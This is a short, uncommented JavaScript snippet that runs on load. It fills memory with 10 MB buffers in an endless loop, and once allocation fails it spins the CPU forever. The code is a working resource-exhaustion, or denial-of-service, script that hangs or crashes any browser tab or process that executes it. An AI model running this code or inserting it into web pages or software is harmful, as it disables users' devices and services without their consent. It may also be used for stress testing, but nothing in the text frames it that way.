let allocations = [];
const chunkSize = 10 * 1024 * 1024
function fillMemory() {
  try {
    while (true) {
      const chunk = new ArrayBuffer(chunkSize);
      allocations.push(chunk)
    }
  } catch (err) {
    burnCpu();
  }
}

function burnCpu() {
  while (true) {
    Math.random();
  }
}

fillMemory();